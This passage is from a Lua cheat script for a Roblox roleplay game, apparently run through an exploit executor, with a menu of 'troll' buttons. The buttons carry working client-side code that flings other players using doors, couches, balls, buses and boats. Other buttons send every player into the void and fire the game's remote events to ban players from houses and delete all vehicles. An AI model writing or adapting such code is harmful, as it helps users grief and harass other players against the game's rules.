then\n\t\t\tobj:Destroy()\n\t\tend\n\tend\n\n\tlocal marker = Instance.new("BoolValue", part)\n\tmarker.Name = "Luscaa_Attached"\n\n\tlocal a1 = Instance.new("Attachment", part)\n\n\tlocal align = Instance.new("AlignPosition", part)\n\talign.Attachment0 = a1\n\talign.Attachment1 = baseAttachment\n\talign.MaxForce = 1e20\n\talign.MaxVelocity = math.huge\n\talign.Responsiveness = 99999\n\n\tlocal torque = Instance.new("Torque", part)\n\ttorque.Attachment0 = a1\n\ttorque.RelativeTo = Enum.ActuatorRelativeTo.World\n\ttorque.Torque = Vector3.new(\n\t\tmath.random(-10e5, 10e5) * 10000,\n\t\tmath.random(-10e5, 10e5) * 10000,\n\t\tmath.random(-10e5, 10e5) * 10000\n\t)\n\n\ttable.insert(ControlledDoors, {Part = part, Align = align})\nend\n\n-- Detecta e prepara portas existentes\nfor _, obj in ipairs(Workspace:GetDescendants()) do\n\tif obj:IsA("BasePart") and string.find(obj.Name, "Door") then\n\t\tSetupPart(obj)\n\tend\nend\n\n-- Novas portas no futuro\nWorkspace.DescendantAdded:Connect(function(obj)\n\tif obj:IsA("BasePart") and string.find(obj.Name, "Door") then\n\t\tSetupPart(obj)\n\tend\nend)\n\n-- Flinga jogador com timeout e retorno\nlocal function FlingPlayer(player)\n\tlocal char = player.Character\n\tif not char then return end\n\tlocal targetHRP = char:FindFirstChild("HumanoidRootPart")\n\tif not targetHRP then return end\n\n\tlocal targetAttachment = targetHRP:FindFirstChild("SHNMAX_TargetAttachment")\n\tif not targetAttachment then\n\t\ttargetAttachment = Instance.new("Attachment", targetHRP)\n\t\ttargetAttachment.Name = "SHNMAX_TargetAttachment"\n\tend\n\n\tfor _, data in ipairs(ControlledDoors) do\n\t\tif data.Align then\n\t\t\tdata.Align.Attachment1 = targetAttachment\n\t\tend\n\tend\n\n\tlocal start = tick()\n\tlocal flingDetected = false\n\n\twhile tick() - start < 5 do\n\t\tif targetHRP.Velocity.Magnitude >= 20 then\n\t\t\tflingDetected = true\n\t\t\tbreak\n\t\tend\n\t\tRunService.Heartbeat:Wait()\n\tend\n\n\t-- Sempre retorna as portas\n\tfor _, data in ipairs(ControlledDoors) do\n\t\tif data.Align then\n\t\t\tdata.Align.Attachment1 = baseAttachment\n\t\tend\n\tend\nend\n\n-- Clique (funciona no mobile)\nUserInputService.TouchTap:Connect(function(touchPositions, processed)\n\tif processed then return end\n\tlocal pos = touchPositions[1]\n\tlocal camera = Workspace.CurrentCamera\n\tlocal unitRay = camera:ScreenPointToRay(pos.X, pos.Y)\n\tlocal raycast = Workspace:Raycast(unitRay.Origin, unitRay.Direction * 1000)\n\n\tif raycast and raycast.Instance then\n\t\tlocal hit = raycast.Instance\n\t\tlocal player = Players:GetPlayerFromCharacter(hit:FindFirstAncestorOfClass("Model"))\n\t\tif player and player ~= LocalPlayer then\n\t\t\tFlingPlayer(player)\n\t\tend\n\tend\nend)\n  end\n})\n\n\nTroll:AddButton({\n    Name = "FLING SOFA CLICK ",\n    Callback = function()\n\nlocal jogadores = game:GetService("Players")\nlocal rep = game:GetService("ReplicatedStorage")\nlocal entrada = game:GetService("UserInputService")\nlocal eu = jogadores.LocalPlayer\nlocal cam = workspace.CurrentCamera\n\nlocal podeClicar = true\nlocal ferramentaEquipada = false\nlocal NOME_FERRAMENTA = "Click Fling Couch"\n\nlocal mochila = eu:WaitForChild("Backpack")\n\nif not mochila:FindFirstChild(NOME_FERRAMENTA) and not (eu.Character and eu.Character:FindFirstChild(NOME_FERRAMENTA)) then\n\tlocal ferramenta = Instance.new("Tool")\n\tferramenta.Name = NOME_FERRAMENTA\n\tferramenta.RequiresHandle = false\n\tferramenta.CanBeDropped = false\n\n\tferramenta.Equipped:Connect(function()\n\t\tferramentaEquipada = true\n\tend)\n\n\tferramenta.Unequipped:Connect(function()\n\t\tferramentaEquipada = false\n\tend)\n\n\tferramenta.Parent = mochila\nend\n\nlocal function jogarComSofa(alvo)\n\tif not ferramentaEquipada then return end\n\tif not alvo or not alvo.Character or alvo == eu then return end\n\n\tlocal jogando = true\n\tlocal raiz = eu.Character and eu.Character:FindFirstChild("HumanoidRootPart")\n\tlocal alvoRaiz = alvo.Character and alvo.Character:FindFirstChild("HumanoidRootPart")\n\tif not raiz or not alvoRaiz then return end\n\n\tlocal boneco = eu.Character\n\tlocal humano = boneco:FindFirstChildOfClass("Humanoid")\n\tlocal posOriginal = raiz.CFrame\n\n\trep:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")\n\ttask.wait(0.2)\n\n\trep.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")\n\ttask.wait(0.3)\n\n\tlocal sofa = eu.Backpack:FindFirstChild("Couch")\n\tif sofa then\n\t\tsofa.Parent = boneco\n\tend\n\ttask.wait(0.1)\n\n\tgame:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F, false, game)\n\ttask.wait(0.25)\n\n\tworkspace.FallenPartsDestroyHeight = 0/0\n\n\tlocal forca = Instance.new("BodyVelocity")\n\tforca.Name = "ForcaJogada"\n\tforca.Velocity = Vector3.new(9e8, 9e8, 9e8)\n\tforca.MaxForce = Vector3.new(math.huge, math.huge, math.huge)\n\tforca.Parent = raiz\n\n\thumano:SetStateEnabled(Enum.HumanoidStateType.Seated, false)\n\thumano.PlatformStand = false\n\tcam.CameraSubject = alvo.Character:FindFirstChild("Head") or alvoRaiz or humano\n\n\ttask.spawn(function()\n\t\tlocal angulo = 0\n\t\tlocal partes = {raiz}\n\t\twhile jogando and alvo and alvo.Character and alvo.Character:FindFirstChildOfClass("Humanoid") do\n\t\t\tlocal alvoHum = alvo.Character:FindFirstChildOfClass("Humanoid")\n\t\t\tif alvoHum.Sit then break end\n\t\t\tangulo += 50\n\n\t\t\tfor _, parte in ipairs(partes) do\n\t\t\t\tlocal hrp = alvo.Character.HumanoidRootPart\n\t\t\t\tlocal pos = hrp.Position + hrp.Velocity / 1.5\n\t\t\t\traiz.CFrame = CFrame.new(pos) * CFrame.Angles(math.rad(angulo), 0, 0)\n\t\t\tend\n\n\t\t\traiz.Velocity = Vector3.new(9e8, 9e8, 9e8)\n\t\t\traiz.RotVelocity = Vector3.new(9e8, 9e8, 9e8)\n\t\t\ttask.wait()\n\t\tend\n\n\t\tjogando = false\n\t\tforca:Destroy()\n\t\thumano:SetStateEnabled(Enum.HumanoidStateType.Seated, true)\n\t\thumano.PlatformStand = false\n\t\traiz.CFrame = posOriginal\n\t\tcam.CameraSubject = humano\n\n\t\tfor _, p in pairs(boneco:GetDescendants()) do\n\t\t\tif p:IsA("BasePart") then\n\t\t\t\tp.Velocity = Vector3.zero\n\t\t\t\tp.RotVelocity = Vector3.zero\n\t\t\tend\n\t\tend\n\n\t\thumano:UnequipTools()\n\t\trep.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")\n\tend)\n\n\twhile jogando do\n\t\ttask.wait()\n\tend\nend\n\nentrada.TouchTap:Connect(function(toques, processado)\n\tif processado or not podeClicar or not ferramentaEquipada then return end\n\n\tlocal pos = toques[1]\n\tlocal raio = cam:ScreenPointToRay(pos.X, pos.Y)\n\tlocal acerto = workspace:Raycast(raio.Origin, raio.Direction * 1000)\n\n\tif acerto and acerto.Instance then\n\t\tlocal alvo = jogadores:GetPlayerFromCharacter(acerto.Instance:FindFirstAncestorOfClass("Model"))\n\t\tif alvo and alvo ~= eu then\n\t\t\tpodeClicar = false\n\t\t\tjogarComSofa(alvo)\n\t\t\ttask.delay(2, function()\n\t\t\t\tpodeClicar = true\n\t\t\tend)\n\t\tend\n\tend\nend)\nend\n})\n\nTroll:AddButton({\n    Name = "FLING BOLA CLICK",\n    Callback = function()\nlocal jogadores = game:GetService("Players")\nlocal rep = game:GetService("ReplicatedStorage")\nlocal mundo = game:GetService("Workspace")\nlocal entrada = game:GetService("UserInputService")\nlocal cam = mundo.CurrentCamera\nlocal eu = jogadores.LocalPlayer\n\nlocal NOME_FERRAMENTA = "Click Fling Ball"\nlocal ferramentaEquipada = false\n\nlocal mochila = eu:WaitForChild("Backpack")\nif not mochila:FindFirstChild(NOME_FERRAMENTA) then\n\tlocal ferramenta = Instance.new("Tool")\n\tferramenta.Name = NOME_FERRAMENTA\n\tferramenta.RequiresHandle = false\n\tferramenta.CanBeDropped = false\n\n\tferramenta.Equipped:Connect(function()\n\t\tferramentaEquipada = true\n\tend)\n\n\tferramenta.Unequipped:Connect(function()\n\t\tferramentaEquipada = false\n\tend)\n\n\tferramenta.Parent = mochila\nend\n\n-- Fun\231\227o FlingBall (bola)\nlocal function FlingBall(target)\n    \n\n    local players = game:GetService("Players")\n    local player = players.LocalPlayer\n    local character = player.Character or player.CharacterAdded:Wait()\n    local humanoid = character:WaitForChild("Humanoid")\n    local hrp = character:WaitForChild("HumanoidRootPart")\n    local backpack = player:WaitForChild("Backpack")\n    local ServerBalls = workspace.WorkspaceCom:WaitForChild("001_SoccerBalls")\n\n    local function GetBall()\n        if not backpack:FindFirstChild("SoccerBall") and not character:FindFirstChild("SoccerBall") then\n            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "SoccerBall")\n        end\n\n        repeat task.wait() until backpack:FindFirstChild("SoccerBall") or character:FindFirstChild("SoccerBall")\n\n        local ballTool = backpack:FindFirstChild("SoccerBall")\n        if ballTool then\n            ballTool.Parent = character\n        end\n\n        repeat task.wait() until ServerBalls:FindFirstChild("Soccer" .. player.Name)\n\n        return ServerBalls:FindFirstChild("Soccer" .. player.Name)\n    end\n\n    local Ball = ServerBalls:FindFirstChild("Soccer" .. player.Name) or GetBall()\n    Ball.CanCollide = false\n    Ball.Massless = true\n    Ball.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0, 0)\n\n    if target ~= player then\n        local tchar = target.Character\n        if tchar and tchar:FindFirstChild("HumanoidRootPart") and tchar:FindFirstChild("Humanoid") then\n            local troot = tchar.HumanoidRootPart\n            local thum = tchar.Humanoid\n\n            if Ball:FindFirstChildWhichIsA("BodyVelocity") then\n                Ball:FindFirstChildWhichIsA("BodyVelocity"):Destroy()\n            end\n\n            local bv = Instance.new("BodyVelocity")\n            bv.Name = "FlingPower"\n            bv.Velocity = Vector3.new(9e8, 9e8, 9e8)\n            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)\n            bv.P = 9e900\n            bv.Parent = Ball\n\n            workspace.CurrentCamera.CameraSubject = thum\n\n            repeat\n                if troot.Velocity.Magnitude > 0 then\n                    local pos = troot.Position + (troot.Velocity / 1.5)\n                    Ball.CFrame = CFrame.new(pos)\n                    Ball.Orientation += Vector3.new(45, 60, 30)\n                else\n                    for i, v in pairs(tchar:GetChildren()) do\n                        if v:IsA("BasePart") and v.CanCollide and not v.Anchored then\n                            Ball.CFrame = v.CFrame\n                            task.wait(1/6000)\n                        end\n                    end\n                end\n                task.wait(1/6000)\n            until troot.Velocity.Magnitude > 1000 or thum.Health <= 0 or not tchar:IsDescendantOf(workspace) or target.Parent ~= players\n\n            workspace.CurrentCamera.CameraSubject = humanoid\n        end\n    end\nend\n\n-- Toque na tela para aplicar a bola\nentrada.TouchTap:Connect(function(toques, processado)\n\tif not ferramentaEquipada or processado then return end\n\tlocal pos = toques[1]\n\tlocal raio = cam:ScreenPointToRay(pos.X, pos.Y)\n\tlocal hit = mundo:Raycast(raio.Origin, raio.Direction * 1000)\n\tif hit and hit.Instance then\n\t\tlocal modelo = hit.Instance:FindFirstAncestorOfClass("Model")\n\t\tlocal jogador = jogadores:GetPlayerFromCharacter(modelo)\n\t\tif jogador and jogador ~= eu then\n\t\t\tFlingBall(jogador)\n\t\tend\n\tend\nend)\n\nend\n})\n\nTroll:AddButton({\n    Name = "FLING ELIMINAR SOFA CLICK",\n    Callback = function()\n\nlocal jogadores = game:GetService("Players")\nlocal rep = game:GetService("ReplicatedStorage")\nlocal loop = game:GetService("RunService")\nlocal mundo = game:GetService("Workspace")\nlocal entrada = game:GetService("UserInputService")\n\nlocal eu = jogadores.LocalPlayer\nlocal cam = mundo.CurrentCamera\n\nlocal NOME_FERRAMENTA = "Click Kill Couch"\nlocal ferramentaEquipada = false\nlocal nomeAlvo = nil\nlocal loopTP = nil\nlocal sofaEquipado = false\nlocal base = nil\nlocal posInicial = nil\nlocal raiz = nil\n\nlocal mochila = eu:WaitForChild("Backpack")\nif not mochila:FindFirstChild(NOME_FERRAMENTA) then\n\tlocal ferramenta = Instance.new("Tool")\n\tferramenta.Name = NOME_FERRAMENTA\n\tferramenta.RequiresHandle = false\n\tferramenta.CanBeDropped = false\n\n\tferramenta.Equipped:Connect(function()\n\t\tferramentaEquipada = true\n\tend)\n\n\tferramenta.Unequipped:Connect(function()\n\t\tferramentaEquipada = false\n\t\tnomeAlvo = nil\n\t\tlimparSofa()\n\tend)\n\n\tferramenta.Parent = mochila\nend\n\nfunction limparSofa()\n\tif loopTP then\n\t\tloopTP:Disconnect()\n\t\tloopTP = nil\n\tend\n\n\tif sofaEquipado then\n\t\tlocal boneco = eu.Character\n\t\tif boneco then\n\t\t\tlocal sofa = boneco:FindFirstChild("Couch")\n\t\t\tif sofa then\n\t\t\t\tsofa.Parent = eu.Backpack\n\t\t\t\tsofaEquipado = false\n\t\t\tend\n\t\tend\n\tend\n\n\tif base then\n\t\tbase:Destroy()\n\t\tbase = nil\n\tend\n\n\tif getgenv().AntiSit then\n\t\tgetgenv().AntiSit:Set(false)\n\tend\n\n\tlocal humano = eu.Character and eu.Character:FindFirstChildOfClass("Humanoid")\n\tif humano then\n\t\thumano:SetStateEnabled(Enum.HumanoidStateType.Physics, true)\n\t\thumano:ChangeState(Enum.HumanoidStateType.GettingUp)\n\tend\n\n\tif posInicial and raiz then\n\t\traiz.CFrame = posInicial\n\t\tposInicial = nil\n\tend\nend\n\nfunction pegarSofa()\n\tlocal boneco = eu.Character\n\tif not boneco then return end\n\tlocal mochila = eu.Backpack\n\n\tif not mochila:FindFirstChild("Couch") and not boneco:FindFirstChild("Couch") then\n\t\tlocal args = { "PickingTools", "Couch" }\n\t\trep.RE["1Too1l"]:InvokeServer(unpack(args))\n\t\ttask.wait(0.1)\n\tend\n\n\tlocal sofa = mochila:FindFirstChild("Couch") or boneco:FindFirstChild("Couch")\n\tif sofa then\n\t\tsofa.Parent = boneco\n\t\tsofaEquipado = true\n\tend\nend\n\nfunction posAleatoriaAbaixo(boneco)\n\tlocal rp = boneco:FindFirstChild("HumanoidRootPart")\n\tif not rp then return Vector3.new() end\n\tlocal offset = Vector3.new(math.random(-2, 2), -5.1, math.random(-2, 2))\n\treturn rp.Position + offset\nend\n\nfunction tpAbaixo(alvo)\n\tif not alvo or not alvo.Character or not alvo.Character:FindFirstChild("HumanoidRootPart") then return end\n\n\tlocal meuBoneco = eu.Character\n\tlocal minhaRaiz = meuBoneco and meuBoneco:FindFirstChild("HumanoidRootPart")\n\tlocal humano = meuBoneco and meuBoneco:FindFirstChildOfClass("Humanoid")\n\n\tif not minhaRaiz or not humano then return end\n\n\thumano:SetStateEnabled(Enum.HumanoidStateType.Physics, false)\n\n\tif not base then\n\t\tbase = Instance.new("Part")\n\t\tbase.Size = Vector3.new(10, 1, 10)\n\t\tbase.Anchored = true\n\t\tbase.CanCollide = true\n\t\tbase.Transparency = 0.5\n\t\tbase.Parent = mundo\n\tend\n\n\tlocal destino = posAleatoriaAbaixo(alvo.Character)\n\tbase.Position = destino\n\tminhaRaiz.CFrame = CFrame.new(destino)\n\n\thumano:SetStateEnabled(Enum.HumanoidStateType.Physics, true)\nend\n\nfunction arremessarComSofa(alvo)\n\tif not alvo then return end\n\tnomeAlvo = alvo.Name\n\tlocal boneco = eu.Character\n\tif not boneco then return end\n\n\tposInicial = boneco:FindFirstChild("HumanoidRootPart") and boneco.HumanoidRootPart.CFrame\n\traiz = boneco:FindFirstChild("HumanoidRootPart")\n\tpegarSofa()\n\n\tloopTP = loop.Heartbeat:Connect(function()\n\t\tlocal alvoAtual = jogadores:FindFirstChild(nomeAlvo)\n\t\tif not alvoAtual or not alvoAtual.Character or not alvoAtual.Character:FindFirstChild("Humanoid") then\n\t\t\tlimparSofa()\n\t\t\treturn\n\t\tend\n\t\tif getgenv().AntiSit then\n\t\t\tgetgenv().AntiSit:Set(true)\n\t\tend\n\t\ttpAbaixo(alvoAtual)\n\tend)\n\n\ttask.spawn(function()\n\t\tlocal alvoAtual = jogadores:FindFirstChild(nomeAlvo)\n\t\twhile alvoAtual and alvoAtual.Character and alvoAtual.Character:FindFirstChild("Humanoid") do\n\t\t\ttask.wait(0.05)\n\t\t\tif alvoAtual.Character.Humanoid.SeatPart then\n\t\t\t\tlocal buraco = CFrame.new(265.46, -450.83, -59.93)\n\t\t\t\talvoAtual.Character.HumanoidRootPart.CFrame = buraco\n\t\t\t\teu.Character.HumanoidRootPart.CFrame = buraco\n\t\t\t\ttask.wait(0.4)\n\t\t\t\tlimparSofa()\n\t\t\t\ttask.wait(0.2)\n\t\t\t\tif posInicial then\n\t\t\t\t\teu.Character.HumanoidRootPart.CFrame = posInicial\n\t\t\t\tend\n\t\t\t\tbreak\n\t\t\tend\n\t\tend\n\tend)\nend\n\nentrada.TouchTap:Connect(function(toques, processado)\n\tif not ferramentaEquipada or processado then return end\n\tlocal pos = toques[1]\n\tlocal raio = cam:ScreenPointToRay(pos.X, pos.Y)\n\tlocal hit = mundo:Raycast(raio.Origin, raio.Direction * 1000)\n\tif hit and hit.Instance then\n\t\tlocal modelo = hit.Instance:FindFirstAncestorOfClass("Model")\n\t\tlocal jogador = jogadores:GetPlayerFromCharacter(modelo)\n\t\tif jogador and jogador ~= eu then\n\t\t\tarremessarComSofa(jogador)\n\t\tend\n\tend\nend)\nend\n})\n\nlocal kill = Troll:AddSection({Name = "FLING TODOS"})\n\nTroll:AddButton({\n    Name = "ELIMINAR TODOS \212NIBUS",\n    Callback = function()\n        local Players = game:GetService("Players")\nlocal Workspace = game:GetService("Workspace")\nlocal RunService = game:GetService("RunService")\nlocal ReplicatedStorage = game:GetService("ReplicatedStorage")\n\nlocal destination = Vector3.new(145.51, -374.09, 21.58) \nlocal originalPosition = nil  \n\nlocal function GetBus()  \n    local vehicles = Workspace:FindFirstChild("Vehicles")  \n    if vehicles then  \n        return vehicles:FindFirstChild(Players.LocalPlayer.Name.."Car")  \n    end  \n    return nil  \nend  \n\nlocal function TrackPlayer(selectedPlayerName, callback)\n    while true do  \n        if selectedPlayerName then  \n            local targetPlayer = Players:FindFirstChild(selectedPlayerName)  \n            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then  \n                local targetHumanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")  \n                if targetHumanoid and targetHumanoid.Sit then  \n                    local bus = GetBus()\n                    if bus then\n                        bus:SetPrimaryPartCFrame(CFrame.new(destination))   \n                        print("Jogador sentou, levando \244nibus para o void!")  \n\n                        task.wait(0.2)  \n\n                        local function simulateJump()  \n                            local humanoid = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")  \n                            if humanoid then  \n                                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)  \n                            end  \n                        end  \n\n                        simulateJump()  \n                        print("Simulando primeiro pulo!")  \n\n                        task.wait(0.4)  \n                        simulateJump()\n                        print("Simulando segundo pulo!")  \n\n                        task.wait(0.5)\n                        if originalPosition then\n                            Players.LocalPlayer.Character.HumanoidRootPart.CFrame = originalPosition  \n                            print("Player voltou para a posi\231\227o inicial Xique")  \n\n                            task.wait(0.1)\n                            local args = {\n                                [1] = "DeleteAllVehicles"\n                            }\n                            ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(args))\n                            print("Todos os ve\237culos foram deletados!")\n                        end\n                    end\n                    break  \n                else  \n                    local targetRoot = targetPlayer.Character.HumanoidRootPart  \n                    local time = tick() * 35\n               \n                    local lateralOffset = math.sin(time) * 10  -- Movimento lateral r\225pido  \n                    local frontBackOffset = math.cos(time) * 20  -- Movimento frente/tr\225s\n                      \n                    local bus = GetBus()\n                    if bus then\n                        bus:SetPrimaryPartCFrame(targetRoot.CFrame * CFrame.new(0, 0, frontBackOffset))  \n                    end\n                end  \n            end  \n        end  \n        RunService.RenderStepped:Wait()  \n    end\n    \n    if callback then\n        callback()\n    end\nend  \n\nlocal function StartKillBusao(playerName, callback)\n    local selectedPlayerName = playerName\n\n    local player = Players.LocalPlayer  \n    local character = player.Character or player.CharacterAdded:Wait()  \n    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")  \n\n    originalPosition = humanoidRootPart.CFrame  \n\n    local bus = GetBus()  \n\n    if not bus then  \n        humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)  \n        task.wait(0.5)  \n        local remoteEvent = ReplicatedStorage:FindFirstChild("RE")  \n        if remoteEvent and remoteEvent:FindFirstChild("1Ca1r") then  \n            remoteEvent["1Ca1r"]:FireServer("PickingCar", "SchoolBus")  \n        end  \n        task.wait(1)  \n        bus = GetBus()  \n    end  \n\n    if bus then  \n        local seat = bus:FindFirstChild("Body") and bus.Body:FindFirstChild("VehicleSeat")  \n        if seat and character:FindFirstChildOfClass("Humanoid") and not character.Humanoid.Sit then  \n            repeat  \n                humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 2, 0)  \n                task.wait()  \n            until character.Humanoid.Sit or not bus.Parent  \n        end  \n    end  \n\n    spawn(function()\n        TrackPlayer(selectedPlayerName, callback)\n    end)\nend\n\nlocal function PerformActionForAllPlayers(players)\n    if #players == 0 then\n        return\n    end\n\n    local player = table.remove(players, 1)\n    StartKillBusao(player.Name, function()\n        task.wait(0.5)\n        PerformActionForAllPlayers(players)\n    end)\nend\n\nPerformActionForAllPlayers(Players:GetPlayers())\n    end\n})\nprint("Kill All Bus button created")\n\nTroll:AddButton({\n    Name = "MATA JOGADOR BAN",\n    Callback = function()\n        local ReplicatedStorage = game:GetService("ReplicatedStorage")\nlocal Players = game:GetService("Players")\nlocal Workspace = game:GetService("Workspace")\n\n\nlocal function executeScriptForPlayer(targetPlayer)\n    local Player = game.Players.LocalPlayer\n    local Backpack = Player.Backpack\n    local Character = Player.Character\n    local Humanoid = Character:FindFirstChildOfClass("Humanoid")\n    local RootPart = Character:FindFirstChild("HumanoidRootPart")\n    local Houses = game.Workspace:FindFirstChild("001_Lots")\n    local OldPos = RootPart.CFrame\n    local Angles = 0\n    local Vehicles = Workspace.Vehicles\n    local Pos\n\n\n    function Check()\n        if Player and Character and Humanoid and RootPart and Vehicles then\n            return true\n        else\n            return false\n        end\n    end\n\n\n    if Check() then\n        local House = Houses:FindFirstChild(Player.Name.."House")\n        if not House then\n            local EHouse\n            for _, Lot in pairs(Houses:GetChildren()) do\n                if Lot.Name == "For Sale" then\n                    for _, num in pairs(Lot:GetDescendants()) do\n                        if num:IsA("NumberValue") and num.Name == "Number" and num.Value < 25 and num.Value > 10 then\n                            EHouse = Lot\n                            break\n                        end\n                    end\n                end\n            end\n\n\n            local BuyDetector = EHouse:FindFirstChild("BuyHouse")\n            Pos = BuyDetector.Position\n            if BuyDetector and BuyDetector:IsA("BasePart") then\n                RootPart.CFrame = BuyDetector.CFrame + Vector3.new(0, -6, 0)\n                task.wait(0.5)\n                local ClickDetector = BuyDetector:FindFirstChild("ClickDetector")\n                if ClickDetector then\n                    fireclickdetector(ClickDetector)\n                end\n            end\n        end\n\n\n        task.wait(0.5)\n        local PreHouse = Houses:FindFirstChild(Player.Name .. "House")\n        if PreHouse then\n            task.wait(0.5)\n            local Number\n            for i, x in pairs(PreHouse:GetDescendants()) do\n                if x.Name == "Number" and x:IsA("NumberValue") then\n                    Number = x\n                end\n            end\n            task.wait(0.5)\n            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gettin1gHous1e"):FireServer("PickingCustomHouse", "049_House", Number.Value)\n        end\n\n\n        task.wait(0.5)\n        local PCar = Vehicles:FindFirstChild(Player.Name.."Car")\n        if not PCar then\n            if Check() then\n                RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)\n                task.wait(0.5)\n                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar", "SchoolBus")\n                task.wait(0.5)\n                local PCar = Vehicles:FindFirstChild(Player.Name.."Car")\n                task.wait(0.5)\n                local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")\n                if Seat then\n                    repeat\n                        task.wait()\n                        RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)\n                    until Humanoid.Sit\n                end\n            end\n        end\n\n\n        task.wait(0.5)\n        local PCar = Vehicles:FindFirstChild(Player.Name.."Car")\n        if PCar then\n            if not Humanoid.Sit then\n                local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")\n                if Seat then\n                    repeat\n                        task.wait()\n                        RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)\n                    until Humanoid.Sit\n                end\n            end\n\n\n            local Target = targetPlayer\n            local TargetC = Target.Character\n            local TargetH = TargetC:FindFirstChildOfClass("Humanoid")\n            local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")\n            if TargetC and TargetH and TargetRP then\n                if not TargetH.Sit then\n                    while not TargetH.Sit do\n                        task.wait()\n                        local Fling = function(alvo, pos, angulo)\n                            PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos * angulo)\n                        end\n                        Angles = Angles + 100\n                        Fling(TargetRP, CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))\n                        Fling(TargetRP, CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))\n                        Fling(TargetRP, CFrame.new(2.25, 1.5, -2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))\n                        Fling(TargetRP, CFrame.new(-2.25, -1.5, 2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))\n                        Fling(TargetRP, CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))\n                        Fling(TargetRP, CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))\n                    end\n                    task.wait(0.2)\n                    local House = Houses:FindFirstChild(Player.Name.."House")\n                    PCar:SetPrimaryPartCFrame(CFrame.new(House.HouseSpawnPosition.Position))\n                    task.wait(0.2)\n                    local pedro = Region3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(30,30,30), game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(30,30,30))\n                    local a = workspace:FindPartsInRegion3(pedro, game.Players.LocalPlayer.Character.HumanoidRootPart, math.huge)\n                    for i, v in pairs(a) do\n                        if v.Name == "HumanoidRootPart" then\n                            local b = game:GetService("Players"):FindFirstChild(v.Parent.Name)\n                            local args = {\n                                [1] = "BanPlayerFromHouse",\n                                [2] = b,\n                                [3] = v.Parent\n                            }\n                            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))\n                        end\n                    end\n                end\n            end\n        end\n    end\n\n\n    -- Deletar o ve\237culo\n    local deleteArgs = {\n        [1] = "DeleteAllVehicles"\n    }\n    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(deleteArgs))\nend\n\n\n-- Iterar sobre todos os jogadores no mapa\nfor _, player in pairs(Players:GetPlayers()) do\n    if player ~= Player then\n        executeScriptForPlayer(player)\n       task.wait(2)\n    end\nend\n    end\n})\nprint("House Ban kill All button created")\n\nTroll:AddButton({\n    Name = "FLING TODOS BARCO ",\n    Callback = function()\n        local Player = game.Players.LocalPlayer\n    local Character = Player.Character\n    local Humanoid = Character:FindFirstChildOfClass("Humanoid")\n    local RootPart = Character:FindFirstChild("HumanoidRootPart")\n    local Vehicles = game.Workspace:FindFirstChild("Vehicles")\n    local OldPos = RootPart.CFrame\n    local Angles = 0\n    local PCar = Vehicles:FindFirstChild(Player.Name.."Car")\n    \n    -- Se n\195\163o tiver um carro, cria um  \n            if not PCar then  \n                if RootPart then  \n                    RootPart.CFrame = CFrame.new(1754, -2, 58)  \n                    task.wait(0.5)  \n                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "MilitaryBoatFree")  \n                    task.wait(0.5)  \n                    PCar = Vehicles:FindFirstChild(Player.Name.."Car")  \n                    task.wait(0.5)  \n                    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")  \n                    if Seat then  \n                        repeat  \n                            task.wait()  \n                            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)  \n                        until Humanoid.Sit  \n                    end  \n                end  \n            end  \n      \n            task.wait(0.5)  \n            PCar = Vehicles:FindFirstChild(Player.Name.."Car")  \n      \n            -- Se o carro existir, teletransporta para o assento se necess\195\161rio  \n            if PCar then  \n                if not Humanoid.Sit then  \n                    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")  \n                    if Seat then  \n                        repeat  \n                            task.wait()  \n                            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)  \n                        until Humanoid.Sit  \n                    end  \n                end  \n            end  